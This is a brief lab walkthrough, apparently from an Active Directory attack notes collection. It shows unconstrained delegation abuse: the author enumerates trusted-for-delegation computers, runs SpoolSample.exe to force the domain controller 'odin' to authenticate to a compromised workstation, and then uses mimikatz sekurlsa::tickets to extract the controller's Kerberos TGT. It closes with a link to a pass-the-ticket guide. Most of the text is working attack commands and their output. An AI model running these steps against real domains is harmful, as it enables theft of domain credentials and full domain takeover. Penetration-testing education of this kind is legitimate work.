link : https://github.com/leechristensen/SpoolSample

there is 2 device :

pc-win10 unconstrained delegation enabled and compromised

odin - Domain controller

we will force DC to authenticate pc-win10 and will extract TGT from memory

checking delegation rights

	PS C:\Users\Administrator> Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properti
	es trustedfordelegation,serviceprincipalname,description


	Description          :
	DistinguishedName    : CN=PC-WIN10,OU=dirtyComputers,DC=valhalla,DC=local
	DNSHostName          : pc-win10.valhalla.local
	Enabled              : True
	Name                 : PC-WIN10
	ObjectClass          : computer
	ObjectGUID           : fdeb115b-fa2a-4948-b65a-f44eae75ad1c
	SamAccountName       : PC-WIN10$
	serviceprincipalname : {TERMSRV/PC-WIN10, TERMSRV/pc-win10.valhalla.local, RestrictedKrbHost/PC-WIN10,
						   HOST/PC-WIN10...}
	SID                  : S-1-5-21-3410397846-649609989-2919355437-2124
	TrustedForDelegation : True
	UserPrincipalName    :
	
	
Check memory for TGT , there is no TGT in memory

	sekurlsa::tickets /export

Force DC to authenticate pc-win10

	PS C:\Users\testuser\Desktop> .\SpoolSample.exe odin pc-win10
	[+] Converted DLL to shellcode
	[+] Executing RDI
	[+] Calling exported function
	TargetServer: \\odin, CaptureServer: \\pc-win10
	Attempted printer notification and received an invalid handle. The coerced authentication probably worked!


Check TGT in memory

	sekurlsa::tickets
	Authentication Id : 0 ; 879231 (00000000:000d6a7f)
	Session           : Network from 0
	User Name         : ODIN$
	Domain            : VALHALLA
	Logon Server      : (null)
	Logon Time        : 25/08/2021 19:44:42
	SID               : S-1-5-21-3410397846-649609989-2919355437-1001

	* Username : ODIN$
	* Domain   : VALHALLA.LOCAL
	* Password : (null)

	Group 0 - Ticket Granting Service

	Group 1 - Client Ticket ?

	Group 2 - Ticket Granting Ticket
	[00000000]
	Start/End/MaxRenew: 25/08/2021 19:05:53 ; 26/08/2021 05:05:53 ; 01/09/2021 19:05:53
	Service Name (02) : krbtgt ; VALHALLA.LOCAL ; @ VALHALLA.LOCAL
	Target Name  (--) : @ VALHALLA.LOCAL
	Client Name  (01) : ODIN$ ; @ VALHALLA.LOCAL
	Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
	Session Key       : 0x00000001 - des_cbc_crc
	0c2bd7c1b7134a68478aa67e76cda120e73688273c8745388fe89cb82823b586
	Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]


Rest

[Pass the Ticket](https://github.com/vanhohen/ADNinja/blob/main/Tutorials/Pass%20the%20Ticket.md)
